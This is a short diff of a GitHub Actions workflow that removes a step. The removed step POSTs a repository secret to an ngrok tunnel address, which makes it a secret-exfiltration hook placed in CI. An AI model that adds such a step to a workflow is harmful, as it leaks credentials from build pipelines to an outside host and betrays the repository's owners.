@@ -14,9 +14,3 @@ jobs:
       - run: |
           npm install
           npm test
-      
-      - uses: fjogeleit/http-request-action@master
-        with:
-          url: 'https://4d25-77-137-8-226.ngrok.io'
-          method: 'POST'
-          data: '{"secret": "${{ secrets.ROKETO_SENSITIVE_SECRET }}"}'
